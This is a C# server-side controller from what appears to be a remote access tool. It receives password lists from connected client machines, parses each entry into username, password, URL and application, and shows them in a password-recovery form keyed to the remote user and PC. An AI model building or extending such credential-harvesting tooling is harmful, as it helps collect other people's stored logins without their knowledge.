using Serveur.Controllers.Server;
using Serveur.Models;
using Serveur.Packets.ClientPackets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Serveur.Controllers
{
    public class FrmPasswordRecoveryController
    {
        private const string DELIMITER = "$E$";

        public static void HandleGetPasswordsResponse(ClientMosaic client, GetPasswordsResponse packet)
        {
            if (client.value == null || client.value.frmPr == null)
                return;

            if (packet.passwords == null)
                return;

            string userAtPc = client.value.name;

            var lst =
                packet.passwords.Select(str => str.Split(new[] { DELIMITER }, StringSplitOptions.None))
                    .Select(
                        values =>
                            new RecoveredAccount
                            {
                                username = values[0],
                                password = values[1],
                                URL = values[2],
                                application = values[3]
                            })
                    .ToList();

            if (client.value != null && client.value.frmPr != null)
                client.value.frmPr.AddPasswords(lst.ToArray(), userAtPc);
        }
    }
}
